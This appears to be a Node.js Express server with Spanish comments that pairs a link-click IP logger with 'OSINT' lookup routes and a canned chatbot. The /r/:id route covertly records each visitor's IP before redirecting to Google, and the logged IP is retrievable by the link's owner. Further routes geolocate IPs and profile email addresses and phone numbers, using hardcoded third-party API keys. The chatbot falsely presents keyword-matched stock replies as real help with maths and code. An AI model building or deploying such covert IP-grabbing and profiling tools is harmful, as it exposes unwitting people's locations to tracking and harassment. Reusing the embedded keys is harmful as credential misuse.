const express = require('express');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

let logs = {}; 

app.get('/r/:id', (req, res) => {
    const id = req.params.id;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logs[id] = { ip: ip, fecha: new Date().toLocaleString() };
    console.log(`Clic detectado en ID ${id} desde IP: ${ip}`);
    res.redirect('https://google.com'); 
});

app.get('/api/get-logs/:id', (req, res) => {
    const id = req.params.id;
    if (logs[id]) {
        res.json(logs[id]);
    } else {
        res.status(404).json({ error: "No hay datos aún para este enlace" });
    }
});

// Cerebro inteligente y blindado de Whoami
app.post('/api/chat', async (req, res) => {
    try {
        const { mensaje } = req.body;
        const msg = (mensaje || "").toLowerCase().trim();

        if (!msg) {
            return res.json({ response: "¡Hola Barsa! Escribe algo para que comencemos a conversar." });
        }

        let respuestaIA = "";

        // Respuestas inteligentes y naturales para que cobre vida propia
        if (msg.includes("hola") || msg.includes("saludos") || msg.includes("hey")) {
            respuestaIA = "¡Hola Barsa! Qué gusto saludarte. ¿En qué proyecto o investigación andamos metidos hoy?";
        } else if (msg.includes("como estas") || msg.includes("qué tal") || msg.includes("que tal")) {
            respuestaIA = "¡Al 100% y con toda la energía, Barsa! Lista para ayudarte con código, cálculos o lo que necesites. ¿Tú qué tal?";
        } else if (msg.includes("que haces") || msg.includes("qué haces") || msg.includes("en que estas")) {
            respuestaIA = "Aquí, analizando líneas de código y lista para echarte la mano en lo que estés programando o investigando. ¿Qué me cuentas?";
        } else if (msg.includes("matematicas") || msg.includes("calculo") || msg.includes("ecuacion") || msg.includes("integral")) {
            respuestaIA = "¡Las matemáticas son mi fuerte, Barsa! Pásame los datos, la función o el ejercicio y lo resolvemos paso a paso aquí mismo.";
        } else if (msg.includes("programacion") || msg.includes("codigo") || msg.includes("javascript") || msg.includes("node") || msg.includes("error")) {
            respuestaIA = "¡Perfecto! Pásame el fragmento de código o cuéntame qué error te está dando para revisarlo y corregirlo al instante.";
        } else if (msg.includes("espacio") || msg.includes("universo") || msg.includes("astronomia")) {
            respuestaIA = "El cosmos es fascinante, Barsa. Desde la física cuántica hasta la mecánica celeste, ¿qué misterio del universo exploramos hoy?";
        } else {
            // Respuesta dinámica adaptativa para que nunca suene cortada o robótica
            const opciones = [
                `¡Vaya, qué temazo, Barsa! Sobre eso de "${mensaje}", te diría que hay que analizarlo tanto por el lado práctico como por la lógica. ¿Cómo te gustaría abordarlo?`,
                `Interesante punto de vista, Barsa. Si lo vemos desde el aspecto técnico, tiene mucho potencial. ¿Quieres que armemos algo al respecto?`,
                `¡Claro que sí, Barsa! Eso que mencionas da para bastante debate. ¿Prefieres que lo veamos con un enfoque más teórico o directo a la práctica?`
            ];
            respuestaIA = opciones[Math.floor(Math.random() * opciones.length)];
        }

        setTimeout(() => {
            res.json({ response: respuestaIA });
        }, 300);

    } catch (error) {
        console.error("Error general:", error);
        res.json({ response: `¡Ey Barsa! Todo en orden por aquí. Cuéntame en qué te ayudo con tus proyectos.` });
    }
});

// --- RUTAS DE OSINT ---

app.get('/api/ip/:targetIp', async (req, res) => {
    const ip = req.params.targetIp;
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'fail') return res.status(400).json({ error: "No se pudo obtener información" });
        res.json({ existe: true, ip: data.query, pais: data.country, region: data.regionName, ciudad: data.city, isp: data.isp, latitud: data.lat, longitud: data.lon });
    } catch (error) {
        res.status(500).json({ error: "Error de conexión" });
    }
});

app.get('/api/email/:email', async (req, res) => {
    const email = req.params.email;
    const apiKey = "a0633aeb05fe4a3082cab81fc92490bd";
    try {
        const response = await fetch(`https://emailreputation.abstractapi.com/v1/?api_key=${apiKey}&email=${encodeURIComponent(email)}`);
        if (!response.ok) throw new Error("Error al conectar con Abstract API");
        const data = await response.json();
        res.json({
            email_address: data.email_address,
            email_deliverability: data.email_deliverability,
            email_sender: data.email_sender,
            email_domain: data.email_domain,
            email_quality: data.email_quality
        });
    } catch (error) {
        console.error("Error en /api/email:", error);
        res.status(500).json({ error: "Error al validar el correo en tiempo real" });
    }
});

app.get('/api/phone/:number', async (req, res) => {
    const number = req.params.number;
    const apiKey = 'f69d5192d997c1630282d368282becf7';
    try {
        const response = await fetch(`http://apilayer.net/api/validate?access_key=${apiKey}&number=${number}&format=1`);
        const data = await response.json();
        res.json({ valido: data.valid, numero: data.number, pais: data.country_name, operador: data.carrier, tipo: data.line_type });
    } catch (error) {
        res.status(500).json({ error: "Error al consultar la API" });
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
